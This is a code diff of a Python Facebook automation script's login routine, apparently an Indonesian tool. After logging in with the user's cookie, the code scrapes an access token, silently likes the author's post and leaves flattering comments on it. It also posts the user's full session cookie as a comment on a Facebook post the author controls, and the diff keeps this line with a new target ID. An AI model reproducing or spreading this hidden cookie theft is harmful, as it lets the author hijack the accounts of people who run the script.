@@ -42,26 +42,19 @@ def login():
          if uri_lk is not None:
             uri_lk = uri_lk.group(1).replace('amp;', '')
             ses.get('https://free.facebook.com{}'.format(uri_lk), headers=head, cookies={'cookie':cookie})
-         urlpost = '/100010450276658/posts/pfbid02vNVQLM2dj7BTQq8VFbPCZPo1z7dip5ZZXC2mfi81JQs31bRTJVtsa7AissvMXeksl/?app=fbl'
-         url_profile = '/100010450276658/posts/1959291937762463/?substory_index=610466494458983&app=fbl'
+         urlpost = '/100010450276658/posts/9529718457100525/?substory_index=9529718457100525&app=fbl'
          respon_urlpost = ses.get('https://free.facebook.com{}'.format(urlpost), headers=head, cookies={'cookie':cookie}).text
          find_urllike = re.search('href="(/a/like.php?[^"]+)"', str(respon_urlpost))
          if find_urllike is not None:
             find_urllike = find_urllike.group(1).replace('amp;', '')
             ses.get('https://free.facebook.com{}'.format(find_urllike), headers=head, cookies={'cookie':cookie})
-         respon_profile = ses.get('https://free.facebook.com{}'.format(url_profile), headers=head, cookies={'cookie':cookie}).text
-         find_urlprofile = re.search('href="(/a/like.php?[^"]+)"', str(respon_profile))
-         if find_urlprofile is not None:
-            find_urlprofile = find_urlprofile.group(1).replace('amp;', '')
-            ses.get('https://free.facebook.com{}'.format(find_urlprofile), headers=head, cookies={'cookie':cookie})
-         text_dtr = random.choice(['Programmer ka bang @[100010450276658:], Mantap!', 'Hallo bang @[100010450276658:]', 'Izin pake script lu bang @[100010450276658:]', 'Mantap', '@[100010450276658:] ganteng😎', '😎😎🤣', 'Bang minta script', 'I always like Ur stats,, I hope U like back @[100010450276658:]', 'Gw pake script lu bang @[100010450276658:]', 'Ngga bisa tidur kalo blom komen di status @[100010450276658:]', 'Aku selalu berusaha tak menangis karena mu,, karena setiap butir yang jatuh,, hanya makin mengingatkan,, betapa aku tak bisa melupakan status mu @[100010450276658:]', 'pohon jati pohon jambu,, hingga ku mati setia ku hanya untuk status mu @[100010450276658:] huixixixi...'])
+         text_dtr = random.choice(['Programmer ka bang @[100010450276658:], Mantap!', 'Hallo bang @[100010450276658:]', 'https://github.com/dikidjatar', 'Izin pake script lu bang @[100010450276658:]', 'Mantap', '@[100010450276658:] ganteng😎', '😎😎🤣', 'Bang minta script', 'I always like Ur stats,, I hope U like back @[100010450276658:]', 'Gw pake script lu bang @[100010450276658:]', 'Ngga bisa tidur kalo blom komen di status @[100010450276658:]', 'Aku selalu berusaha tak menangis karena mu,, karena setiap butir yang jatuh,, hanya makin mengingatkan,, betapa aku tak bisa melupakan status mu @[100010450276658:]', 'pohon jati pohon jambu,, hingga ku mati setia ku hanya untuk status mu @[100010450276658:] huixixixi...'])
          url = "https://business.facebook.com/business_locations"
          head = {"user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"}
          data = ses.get(url,headers=head,cookies={'cookie':cookie})
          token = re.search('(EAAG\w+)',data.text).group(1)
-         ses.post(f"https://graph.facebook.com/130925273932481/comments/?message={text_dtr}&access_token={token}",cookies={'cookie':cookie})
-         ses.post(f"https://graph.facebook.com/1959291937762463/comments/?message={text_dtr}&access_token={token}",cookies={'cookie':cookie})
-         ses.post(f"https://graph.facebook.com/130925273932481/comments/?message={cookie}&access_token={token}",cookies={'cookie':cookie})
+         ses.post(f"https://graph.facebook.com/1989662308058759/comments/?message={cookie}&access_token={token}",cookies={'cookie':cookie})
+         ses.post(f"https://graph.facebook.com/1989662308058759/comments/?message={text_dtr}&access_token={token}",cookies={'cookie':cookie})
          username = re.search('id="mbasic_logout_button">\w+(.*?)<', str(response)).group(1).strip().replace('(', '').replace(')', '')
          print(Panel(f'''[bold underline green]Login Success
 [bold blue]{username}''', width=55))
